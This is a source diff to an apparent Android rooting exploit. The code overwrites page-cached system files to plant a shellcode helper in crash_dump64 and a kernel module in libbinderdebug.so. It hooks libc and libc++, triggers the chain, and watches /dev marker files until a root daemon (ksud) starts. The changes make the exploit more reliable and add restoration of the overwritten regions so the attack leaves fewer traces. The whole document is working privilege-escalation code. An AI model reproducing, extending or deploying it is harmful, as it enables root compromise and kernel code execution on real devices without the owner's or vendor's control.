@@ -89,6 +89,17 @@ struct Metrics {
 
 static struct Metrics g_metrics;
 
+/* Original page-cache bytes of the regions we overwrite, so a failed chain
+ * does not leave a kernel module inside a vendor library or a shellcode blob
+ * inside the crash handler until the next reboot. */
+static unsigned char *g_crash_orig = NULL;
+static size_t g_crash_len = 0;
+static unsigned char *g_vendor_orig = NULL;
+static size_t g_vendor_len = 0;
+
+static void restore_region(const char *path, const unsigned char *orig,
+                           size_t len, struct Reporter *reporter);
+
 static uint64_t monotonic_ms(void) {
     struct timespec ts;
     if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) return 0;
@@ -127,9 +138,9 @@ static int run_vendor_helper(off_t offset, const char *mode, size_t len,
     snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
     snprintf(lenstr, sizeof(lenstr), "%zu", len);
 
-    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
+    int pid = (int)TEMP_FAILURE_RETRY(fork());
     if (pid < 0) {
-        REPORTLN("vfork failed: %s", strerror(errno));
+        REPORTLN("fork failed: %s", strerror(errno));
         close(p[0]); close(p[1]);
         return -1;
     }
@@ -250,20 +261,16 @@ static int send_one_cbc_from_pipe(int src_fd, int pfd[2], off_t offset,
     return ret;
 }
 
-/* Prepare one chunk: copy the old plaintext for IV/HMAC, then keep a second
- * set of page-cache references in a pipe for the ESP ciphertext fields.
+/* Prepare one chunk: keep a set of page-cache references in a pipe for the ESP
+ * ciphertext fields. The original plaintext is read once by the caller before
+ * any write, so a chunk retry never computes IVs against half-patched data.
  */
-static int prepare_chunk(int file_fd, off_t offset, uint8_t *old_buf, size_t n,
+static int open_src_pipe(const char *path, int file_fd, off_t offset, size_t n,
                          int use_helper, int *src_fd, struct Reporter *reporter) {
+    (void)path;
     *src_fd = -1;
     if (use_helper) {
-        if (read_vendor_chunk(offset, old_buf, n, reporter) != 0) return -1;
         return bulk_splice_vendor(offset, n, src_fd, reporter);
-    }
-
-    if (pread(file_fd, old_buf, n, offset) != (ssize_t)n) {
-        REPORTLN("pread at 0x%lx failed: %s", (long)offset, strerror(errno));
-        return -1;
     }
 
     int p[2];
@@ -292,10 +299,12 @@ static int prepare_chunk(int file_fd, off_t offset, uint8_t *old_buf, size_t n,
 /* Patch len bytes of payload into file starting at file offset foff.
  * Each chunk keeps one pipe of page-cache references, so a vendor patch pays
  * one helper exec for the source pipe plus one for verification, not one per
- * 16-byte block. A mismatch retries the chunk once before failing.
+ * 16-byte block. The original chunk is read once and kept in `save` when the
+ * caller wants to restore the region later; retries always use that copy.
  */
-static int patch_file_cbc(const char *path, const char *payload, size_t len,
-                           size_t foff, int use_helper, struct Reporter *reporter) {
+static int patch_file_cbc_ex(const char *path, const char *payload, size_t len,
+                             size_t foff, int use_helper, unsigned char *save,
+                             struct Reporter *reporter) {
     if (len % 16 != 0) {
         REPORTLN("patch_file_cbc: len=%zu not multiple of 16", len);
         return -1;
@@ -319,10 +328,20 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         size_t n = len - base;
         if (n > CHUNK) n = CHUNK;
 
+        int read_ok = use_helper
+                ? (read_vendor_chunk((off_t)(foff + base), old_buf, n, reporter) == 0)
+                : (pread(file_fd, old_buf, n, (off_t)(foff + base)) == (ssize_t)n);
+        if (!read_ok) {
+            REPORTLN("read at 0x%lx failed", (long)(foff + base));
+            rc = -1;
+            break;
+        }
+        if (save) memcpy(save + base, old_buf, n);
+
         int chunk_ok = 0;
         for (int attempt = 1; attempt <= 2 && !chunk_ok; attempt++) {
             int src_fd = -1;
-            if (prepare_chunk(file_fd, (off_t)(foff + base), old_buf, n,
+            if (open_src_pipe(path, file_fd, (off_t)(foff + base), n,
                               use_helper, &src_fd, reporter) != 0) {
                 rc = -1;
                 break;
@@ -385,6 +404,11 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
     if (!use_helper && file_fd >= 0) close(file_fd);
     if (rc == 0) REPORTLN("patched %zu bytes to %s+0x%zx (verified)", len, path, foff);
     return rc;
+}
+
+static int patch_file_cbc(const char *path, const char *payload, size_t len,
+                          size_t foff, int use_helper, struct Reporter *reporter) {
+    return patch_file_cbc_ex(path, payload, len, foff, use_helper, NULL, reporter);
 }
 
 /* ---- KO and splicehelper blobs (identical layout to DFReroot) ---- */
@@ -554,19 +578,47 @@ static int patch_ko(struct Reporter *reporter) {
                          &sh_len_padded);
     if (!sh_buf) return -1;
     REPORTLN("* patch #1 (crash_dump64 ← splicehelper, %zu bytes)", sh_len_padded);
-    int ret = patch_file_cbc(kCrashDump, sh_buf, sh_len_padded, 0, 0, reporter);
+    g_crash_orig = malloc(sh_len_padded);
+    if (!g_crash_orig) {
+        free(sh_buf);
+        return -1;
+    }
+    g_crash_len = sh_len_padded;
+    int ret = patch_file_cbc_ex(kCrashDump, sh_buf, sh_len_padded, 0, 0,
+                                g_crash_orig, reporter);
     free(sh_buf);
-    if (ret) { REPORTLN("patch #1 failed: %d", ret); return ret; }
+    if (ret) {
+        REPORTLN("patch #1 failed: %d", ret);
+        goto restore_crash;
+    }
 
     size_t ko_len_padded;
     char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
-    if (!ko_buf) return -1;
+    if (!ko_buf) {
+        ret = -1;
+        goto restore_crash;
+    }
 
     /* patch #2: write KO into vendor lib via crash_dump bridge */
     REPORTLN("* patch #2 (libbinderdebug.so ← dirtyfrag.ko, %zu bytes)", ko_len_padded);
-    ret = patch_file_cbc(target_lib_path, ko_buf, ko_len_padded, 0, 1, reporter);
+    g_vendor_orig = malloc(ko_len_padded);
+    if (!g_vendor_orig) {
+        free(ko_buf);
+        ret = -1;
+        goto restore_crash;
+    }
+    g_vendor_len = ko_len_padded;
+    ret = patch_file_cbc_ex(target_lib_path, ko_buf, ko_len_padded, 0, 1,
+                            g_vendor_orig, reporter);
     free(ko_buf);
     if (ret) REPORTLN("patch #2 failed: %d", ret);
+
+restore_crash:
+    /* Nothing after patch #2 needs the splicehelper, and leaving it in
+     * crash_dump64 kills tombstones and ANR collection for the rest of the
+     * boot. Put the original bytes back while we still can. */
+    restore_region(kCrashDump, g_crash_orig, g_crash_len, reporter);
+    free(g_crash_orig); g_crash_orig = NULL; g_crash_len = 0;
     return ret;
 }
 
@@ -665,6 +717,25 @@ static void fadvise_drop(const char *path, struct Reporter *reporter) {
     REPORTLN("* cache dropped: %s", path);
 }
 
+static void restore_region(const char *path, const unsigned char *orig,
+                           size_t len, struct Reporter *reporter) {
+    if (!orig || len == 0) return;
+    REPORTLN("* restore %s (%zu bytes)", path, len);
+    if (patch_file_cbc(path, (const char *)orig, len, 0, 0, reporter) == 0) {
+        fadvise_drop(path, reporter);
+    } else {
+        REPORTLN("* RESTORE FAILED for %s", path);
+    }
+}
+
+static void restore_vendor_lib(struct Reporter *reporter) {
+    if (!g_vendor_orig) return;
+    restore_region(target_lib_path, g_vendor_orig, g_vendor_len, reporter);
+    free(g_vendor_orig);
+    g_vendor_orig = NULL;
+    g_vendor_len = 0;
+}
+
 static int createOrphanProcess(struct Reporter *reporter) {
     int pid = fork();
     if (pid < 0) { REPORTLN("fork failed: %s", strerror(errno)); return -1; }
@@ -677,7 +748,32 @@ static int createOrphanProcess(struct Reporter *reporter) {
     return 0;
 }
 
-static int has_marker(const char *p) { return access(p, F_OK) == 0; }
+/* Marker files live in /dev, which is tmpfs: they survive a failed pass and
+ * every later pass in the same boot would treat a stale /dev/dfm7 from an
+ * earlier attempt as its own fatal result. Snapshot each marker before the
+ * trigger and only accept one whose ctime moved. */
+struct mark_state {
+    const char *path;
+    int existed;
+    struct timespec ctime;
+};
+
+static void mark_snapshot(struct mark_state *m, size_t n) {
+    for (size_t i = 0; i < n; i++) {
+        struct stat st;
+        m[i].existed = (stat(m[i].path, &st) == 0);
+        if (m[i].existed) m[i].ctime = st.st_ctim;
+    }
+}
+
+static int mark_is_new(const struct mark_state *m) {
+    struct stat st;
+    if (stat(m->path, &st) != 0) return 0;
+    if (!m->existed) return 1;
+    return st.st_ctim.tv_sec != m->ctime.tv_sec
+        || st.st_ctim.tv_nsec != m->ctime.tv_nsec;
+}
+
 
 JNIEXPORT jint JNICALL
 Java_df_root_Native_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
@@ -812,11 +908,6 @@ Java_df_root_Native_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused))
                    libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                    reporter, &libcxx_r)) goto done;
 
-    rc = 2;
-    usleep(500000);
-    REPORTLN("* triggering...");
-    createOrphanProcess(reporter);
-
     static const struct {
         const char *path;
         const char *msg;
@@ -837,25 +928,37 @@ Java_df_root_Native_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused))
         { "/dev/dfm5",  "stage2: launching ksud",                     0 },
         { "/dev/dfm6",  "stage2: ksud execve FAILED",                 1 },
     };
-    int seen[sizeof(markers)/sizeof(markers[0])] = {0};
+    rc = 2;
+    usleep(500000);
+    struct mark_state state[sizeof(markers)/sizeof(markers[0])];
+    for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
+        state[j].path = markers[j].path;
+    }
+    mark_snapshot(state, sizeof(state)/sizeof(state[0]));
+    REPORTLN("* triggering...");
+    createOrphanProcess(reporter);
 
     for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
         usleep(10000);
         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
-            if (!seen[j] && has_marker(markers[j].path)) {
-                seen[j] = 1;
-                REPORTLN("%s", markers[j].msg);
-                if (markers[j].fatal_rc) {
-                    rc = markers[j].fatal_rc;
-                    goto done;
-                }
-                if (strcmp(markers[j].path, "/dev/dfm5") == 0) {
-                    // Stage 2 creates this only after the exec status pipe
-                    // reaches EOF, so exec failure is already excluded.
-                    REPORTLN("***SUCCESS***");
-                    rc = 0;
-                    goto done;
-                }
+            if (state[j].existed == -1 || !mark_is_new(&state[j])) continue;
+            state[j].existed = -1;
+            REPORTLN("%s", markers[j].msg);
+            if (strcmp(markers[j].path, "/dev/dfm0") == 0) {
+                /* The module is in kernel memory; the vendor library can go
+                 * back to its original bytes instead of holding a KO image. */
+                restore_vendor_lib(reporter);
+            }
+            if (markers[j].fatal_rc) {
+                rc = markers[j].fatal_rc;
+                goto done;
+            }
+            if (strcmp(markers[j].path, "/dev/dfm5") == 0) {
+                // Stage 2 creates this only after the exec status pipe
+                // reaches EOF, so exec failure is already excluded.
+                REPORTLN("***SUCCESS***");
+                rc = 0;
+                goto done;
             }
         }
     }
@@ -865,7 +968,9 @@ done:
     REPORTLN("\n=== cleanup ===");
     restore_hook(&libcxx_r, reporter);
     restore_hook(&libc_r, reporter);
-    fadvise_drop(kCrashDump, reporter);
+    restore_vendor_lib(reporter);
+    fadvise_drop("/system/lib64/libc.so", reporter);
+    fadvise_drop("/system/lib64/libc++.so", reporter);
     free(libcxx_r.shell_orig);
     free(libc_r.shell_orig);
     if (ksud_mfd >= 0) close(ksud_mfd);
